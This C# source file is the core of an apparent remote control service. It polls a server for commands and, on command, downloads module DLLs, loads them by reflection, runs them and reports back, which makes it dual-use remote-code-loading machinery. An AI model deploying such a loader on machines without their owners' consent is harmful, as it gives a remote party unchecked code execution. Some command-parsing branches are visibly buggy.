using ControlService.Core.Models;
using ControlService.ExternalModules;
using ControlService.Models;
using System.Diagnostics;
using System.Reflection;

namespace ControlService.Core
{
    public class Core
    {
        private readonly ILogger<Core> _logger;
        private readonly IConfiguration _configuration;
        private readonly string _baseUrl;

        Dictionary<string, IExternalModule> Modules;
        Api _api;



        SettingsModel _settings;
        EventHandler<EventMessageArgs> _messager;

        public Core(ILogger<Core> logger, IConfiguration configuration)
        {
            _logger = logger;
            _messager += SendMessage;
            _configuration = configuration;
            _baseUrl = _configuration.GetConnectionString("BaseUrl"); ;
        }

        public int Initialization()
        {
            try
            {
                FileManager<SettingsModel> manager = new FileManager<SettingsModel>("settings");
                _settings = manager.ReadFromFile("settings.json");
                if (_settings is null)
                {
                    _settings = new SettingsModel();
                }
#if DEBUG
                Trace.WriteLine($"BaseUrl = {_baseUrl}");
#endif

                _api = new Api(_settings.Guid, _baseUrl);
                _settings.Guid = _api.Guid;
                SaveSettings();
#if DEBUG
                Trace.WriteLine($"Guid = {_settings.Guid}");
#endif
                if (_settings.ExternalModules != null)
                {
                    foreach (string module in _settings.ExternalModules)
                    {
                        IncludeModule(module);
                    }
                }
                else
                {
                    _settings.ExternalModules = new List<string>();
                }
            }
            catch (Exception ex)
            {
                _logger.LogError($"{ex.Message}", DateTimeOffset.Now);
#if DEBUG
                Trace.WriteLine($"{ex.Message} init");
#endif
                return 1;
            }
            return 0;
        }

        public async Task Work()
        {
            try
            {
                CommandsProcessing();
                await Task.Delay(_settings.Delay);
            }
            catch (Exception ex)
            {
                _logger.LogError($"{ex.Message}", DateTimeOffset.Now);
            }

        }

        void SaveSettings()
        {
            FileManager<SettingsModel> manager = new FileManager<SettingsModel>("settings");
            manager.CreateFile("settings.json", _settings);
        }

        void CommandsProcessing()
        {
            Task<List<Command>> task = _api.GetCommands();
            task.Wait();
            List<Command> commands = task.Result;
            foreach (var command in commands)
            {
                try
                {
                    ParseCommand(command);
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "command skipped", DateTimeOffset.Now);
                }

            }
        }

        void ParseCommand(Command command)
        {
            string[] commandlets = command.CommandText.Split(' ');
            switch (commandlets[0])
            {
                case "startmodule":
                    StartModule(commandlets[1], commandlets.Skip(2).ToArray());
                    break;
                case "stopmodule":
                    StopModule(commandlets[1], commandlets.Skip(2).ToArray());
                    break;
                case "delay":
                    _settings.Delay = Convert.ToInt32(commandlets[1]);
                    SaveSettings();
                    break;
                case "includemodule":
                    if (IncludeModule(commandlets[1]) == 0)
                        _settings.ExternalModules.Add(commandlets[1]);
                    SaveSettings();
                    break;
                case "install":
                    InstallModule(commandlets[1]);
                    break;
                default:
                    if (Modules != null && Modules.Count != 0)
                    {
                        IExternalModule module = Modules.FirstOrDefault(u => u.Key == commandlets[0]).Value;
                        if (module != null)
                        {
                            lock (module.CommandsPull)
                            {
                                module.CommandsPull.Enqueue(command.CommandText.Skip(commandlets[0].Length + 1).ToString());
                            }
                            _logger.LogInformation($"Command added to module {module.Name}.", DateTimeOffset.Now);
                        }
                        else
                        {
                            _logger.LogInformation($"module {module.Name} not found. Command doesnt invoke", DateTimeOffset.Now);
                        }
                    }
                    _logger.LogInformation($"module or command not found", DateTimeOffset.Now);

                    break;
            }
        }



        void StartModule(string moduleName, string[] args)
        {
            try
            {
                IExternalModule module = Modules.FirstOrDefault(u => u.Key == moduleName).Value;
                if (module != null)
                {
                    _logger.LogInformation($"starting module {moduleName}", DateTimeOffset.Now);
                    module.StartModule(args);
                }
                else
                {
                    _logger.LogInformation($"module {moduleName} not found", DateTimeOffset.Now);
                }
            }
            catch (Exception ex)
            {
                _logger.LogError($"cant start {moduleName}. {ex.Message}", DateTimeOffset.Now);
            }

        }
        void StopModule(string moduleName, string[] args)
        {
            IExternalModule module = Modules.FirstOrDefault(u => u.Key == moduleName).Value;
            if (module != null)
            {
                _logger.LogInformation($"stopping module {moduleName}", DateTimeOffset.Now);
                module.StopModule(args);
            }
            else
            {
                _logger.LogInformation($"module {moduleName} not found", DateTimeOffset.Now);
            }

        }
        int IncludeModule(string moduleName)
        {
            if (Modules == null)
            {
                Modules = new Dictionary<string, IExternalModule>();
            }
            if (Modules.ContainsKey(moduleName))
            {
                _logger.LogInformation($"cant load {moduleName}. It is already loaded", DateTimeOffset.Now);
            }
            else
            {
                try
                {
                    _logger.LogInformation($"1", DateTimeOffset.Now);
                    Assembly asm = Assembly.LoadFrom("External/" + moduleName + ".dll");
                    Type? t = asm.GetType($"{moduleName}.{moduleName}");
                    object? obj = Activator.CreateInstance(t);
                    _logger.LogInformation($"2", DateTimeOffset.Now);
                    IExternalModule module = (IExternalModule)obj;
                    module.MessageSend = _messager;
                    _logger.LogInformation($"3", DateTimeOffset.Now);
                    Modules.Add(moduleName, module);
                    return 0;
                }
                catch (Exception ex)
                {
                    _logger.LogInformation($"cant load {moduleName}", DateTimeOffset.Now);
                    _logger.LogError($"{ex.Message} {ex.StackTrace}", DateTimeOffset.Now);
                }
            }

            return 1;

        }
        void InstallModule(string moduleName)
        {
            _api.DownloadFile(moduleName);
        }
        void SendMessage(object sender, EventMessageArgs args)
        {
            _logger.LogInformation($"Module {args.ModuleName} sending: {args.Text}", DateTimeOffset.Now);
            _logger.LogInformation($"Sending: {_api.SendMessage(args.Text)}", DateTimeOffset.Now);
        }
        int ExcludeModule(string moduleName)
        {
            if (Modules.ContainsKey(moduleName))
            {
                
            }
            return 1;
        }
    }
}
